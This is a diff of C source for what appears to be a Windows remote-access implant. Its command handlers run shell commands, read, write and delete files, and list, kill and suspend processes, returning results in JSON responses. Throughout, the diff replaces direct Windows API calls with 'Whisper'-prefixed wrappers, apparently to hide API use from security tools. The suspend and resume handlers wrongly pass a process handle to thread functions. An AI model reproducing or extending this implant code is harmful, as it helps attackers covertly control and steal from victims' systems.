@@ -2,6 +2,7 @@
 
 #include <stdio.h>
 #include <windows.h>
+#include <tlhelp32.h> // For WhisperCreateToolhelp32Snapshot, Process32First, Process32Next
 #include "type_conversions.h"
 #include "whisper_config.h"
 #include "whisper_json.h"
@@ -9,7 +10,6 @@
 #include "whisper_dynamic_config.h"
 
 //function command related items
-#include <tlhelp32.h> // For CreateToolhelp32Snapshot, Process32First, Process32Next
 
 
 /*
@@ -219,7 +219,7 @@ void get_username(OutboundJsonDataStruct* response_struct) {
         DWORD error = GetLastError();
         DEBUG_LOGW(L"Failed to get username. Error: %lu\n", error);
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 }
@@ -252,7 +252,7 @@ void shell(OutboundJsonDataStruct* response_struct, char* args) {
         DWORD error = GetLastError();
         DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", error);
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return; // Important: Return on error
     }
@@ -276,7 +276,7 @@ void shell(OutboundJsonDataStruct* response_struct, char* args) {
         DWORD error = GetLastError();
         DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", error);
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
 
         WhisperCloseHandle(hWrite);
@@ -478,14 +478,14 @@ void mkdir(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    if (CreateDirectoryA(path_arg, NULL)) {
+    if (WhisperCreateDirectoryA(path_arg, NULL)) {
         DEBUG_LOG("Directory created: %s\n", path_arg);
         set_response_data(response_struct, "Directory created");
     } else {
         DWORD error = GetLastError();
         DEBUG_LOG("CreateDirectory failed. Error: %lu\n", error);
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message); // Include error message in response
     }
 }
@@ -502,14 +502,14 @@ void rmdir(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    if (RemoveDirectoryA(path_arg)) {
+    if (WhisperRemoveDirectoryA(path_arg)) {
         DEBUG_LOG("Directory removed: %s\n", path_arg);
         set_response_data(response_struct, "Directory removed");
     } else {
         DWORD error = GetLastError();
         DEBUG_LOG("RemoveDirectory failed. Error: %lu\n", error);
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message); // Include error message in response
     }
 }
@@ -526,16 +526,16 @@ void cd(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    if (SetCurrentDirectoryA(path_arg)) {
+    if (WhisperSetCurrentDirectoryA(path_arg)) {
         DEBUG_LOG("Changed directory to: %s\n", path_arg);
         char cwd[MAX_PATH];
-        GetCurrentDirectoryA(MAX_PATH, cwd); // Get the actual current directory
+        WhisperGetCurrentDirectoryA(MAX_PATH, cwd); // Get the actual current directory
         set_response_data(response_struct, cwd); // Respond with the full current directory
     } else {
         DWORD error = GetLastError();
         DEBUG_LOG("SetCurrentDirectory failed. Error: %lu\n", error);
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message); // Include error message in response
     }
 }
@@ -552,7 +552,7 @@ void pwd(OutboundJsonDataStruct* response_struct) {
         DWORD error = GetLastError();
         DEBUG_LOG("GetCurrentDirectory failed. Error: %lu\n", error);
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message); // Include error message in response
     }
 }
@@ -571,23 +571,23 @@ void write_file(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = WhisperCreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (hFile == INVALID_HANDLE_VALUE) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
 
     DWORD bytesWritten;
-    if (WriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
+    if (WhisperWriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
         set_response_data(response_struct, "File written successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 
@@ -603,12 +603,12 @@ void read_file(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    HANDLE hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = WhisperCreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (hFile == INVALID_HANDLE_VALUE) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
@@ -617,7 +617,7 @@ void read_file(OutboundJsonDataStruct* response_struct, char* args) {
     if (fileSize == INVALID_FILE_SIZE) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         WhisperCloseHandle(hFile);
         return;
@@ -631,13 +631,13 @@ void read_file(OutboundJsonDataStruct* response_struct, char* args) {
     }
 
     DWORD bytesRead;
-    if (ReadFile(hFile, contents, fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
+    if (WhisperReadFile(hFile, contents, fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
         contents[fileSize] = '\0';
         set_response_data(response_struct, contents);
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 
@@ -654,12 +654,12 @@ void delete_file(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    if (DeleteFileA(path)) {
+    if (WhisperDeleteFileA(path)) {
         set_response_data(response_struct, "File deleted successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 }
@@ -674,12 +674,12 @@ void append_file(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = WhisperCreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (hFile == INVALID_HANDLE_VALUE) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
@@ -687,12 +687,12 @@ void append_file(OutboundJsonDataStruct* response_struct, char* args) {
     SetFilePointer(hFile, 0, NULL, FILE_END); // Seek to the end
 
     DWORD bytesWritten;
-    if (WriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
+    if (WhisperWriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
         set_response_data(response_struct, "Data appended to file successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 
@@ -709,12 +709,12 @@ void rename_file(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    if (MoveFileA(old_path, new_path)) {
+    if (WhisperMoveFileA(old_path, new_path)) {
         set_response_data(response_struct, "File renamed/moved successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 }
@@ -729,12 +729,12 @@ void copy_file(OutboundJsonDataStruct* response_struct, char* args) {
         return;
     }
 
-    if (CopyFileA(src, dest, FALSE)) {
+    if (WhisperCopyFileA(src, dest, FALSE)) {
         set_response_data(response_struct, "File copied successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 }
@@ -759,12 +759,12 @@ void ls(OutboundJsonDataStruct* response_struct, char* args) {
     wchar_t searchPath[MAX_PATH];
     swprintf(searchPath, MAX_PATH, L"%s\\*", wPath); // Add the wildcard
 
-    hFind = FindFirstFileW(searchPath, &wfd);
+    hFind = WhisperFindFirstFileW(searchPath, &wfd);
 
     if (hFind == INVALID_HANDLE_VALUE) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
@@ -778,7 +778,7 @@ void ls(OutboundJsonDataStruct* response_struct, char* args) {
 
         strcat(fileList, tempFileName);
         strcat(fileList, "\n"); // toss in a newline after appending each item
-    } while (FindNextFileW(hFind, &wfd) != 0);
+    } while (WhisperFindNextFileW(hFind, &wfd) != 0);
 
     FindClose(hFind);
 
@@ -821,7 +821,7 @@ void start_process(OutboundJsonDataStruct* response_struct, char* args) {
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 }
@@ -838,21 +838,21 @@ void kill_process(OutboundJsonDataStruct* response_struct, char* args) {
 
     DWORD pid = strtoul(pid_str, NULL, 10); // Convert PID string to unsigned long
 
-    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    HANDLE hProcess = WhisperOpenProcess(PROCESS_TERMINATE, FALSE, pid);
     if (hProcess == NULL) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
 
-    if (TerminateProcess(hProcess, 1)) { // 1 is the exit code
+    if (WhisperTerminateProcess(hProcess, 1)) { // 1 is the exit code
         set_response_data(response_struct, "Process terminated successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 
@@ -871,21 +871,21 @@ void suspend_process(OutboundJsonDataStruct* response_struct, char* args) {
 
     DWORD pid = strtoul(pid_str, NULL, 10);
 
-    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
+    HANDLE hProcess = WhisperOpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
     if (hProcess == NULL) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
 
-    if (SuspendThread(hProcess) != (DWORD)-1) { // Suspend the main thread
+    if (WhisperSuspendThread(hProcess) != (DWORD)-1) { // Suspend the main thread
         set_response_data(response_struct, "Process suspended successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 
@@ -904,21 +904,21 @@ void resume_process(OutboundJsonDataStruct* response_struct, char* args) {
 
     DWORD pid = strtoul(pid_str, NULL, 10);
 
-    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
+    HANDLE hProcess = WhisperOpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
     if (hProcess == NULL) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
 
-    if (ResumeThread(hProcess) != (DWORD)-1) {
+    if (WhisperResumeThread(hProcess) != (DWORD)-1) {
         set_response_data(response_struct, "Process resumed successfully");
     } else {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
     }
 
@@ -932,11 +932,11 @@ void list_processes(OutboundJsonDataStruct* response_struct) {
 
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
-    hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    hProcessSnapshot = WhisperCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
         DWORD error = GetLastError();
         char error_message[256];
-        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
         return;
     }
@@ -944,7 +944,7 @@ void list_processes(OutboundJsonDataStruct* response_struct) {
     char processList[8192] = ""; // Adjust size as needed.  Consider dynamic allocation for very large lists.
     char tempProcessInfo[512]; // Temporary buffer for each process's info
 
-    if (Process32First(hProcessSnapshot, &pe32)) {
+    if (WhisperProcess32First(hProcessSnapshot, &pe32)) {
         do {
             snprintf(tempProcessInfo, sizeof(tempProcessInfo), "%lu\t%s\n", pe32.th32ProcessID, pe32.szExeFile); // PID and process name
             strcat(processList, tempProcessInfo);
